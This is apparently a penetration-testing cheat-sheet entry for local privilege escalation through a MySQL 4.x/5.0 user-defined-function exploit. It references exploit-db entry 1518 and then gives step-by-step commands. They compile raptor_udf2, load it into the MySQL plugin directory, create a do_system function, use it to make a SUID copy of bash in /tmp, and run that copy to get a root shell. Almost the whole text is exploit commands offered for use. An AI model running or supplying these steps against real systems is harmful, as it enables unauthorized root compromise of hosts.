- - -
##### MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)

**Exploit Link** : [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

Transfer this exploit to the target and use the following commands to compile it :

```sh
gcc -g -c raptor_udf2.c -fPIC
```

```sh
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to mysql service as **root**.

```sh
mysql -uroot
```

Execute the following commands on the MySQL shell :

```mysql
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/evil-bash and set the SUID permission:

```mysql
mysql> select do_system('cp /bin/bash /tmp/evilbash; chmod +xs /tmp/evilbash');
```

Exit out of the MySQL shell and Type :

```sh
/tmp/evilbash -p
```

- - -
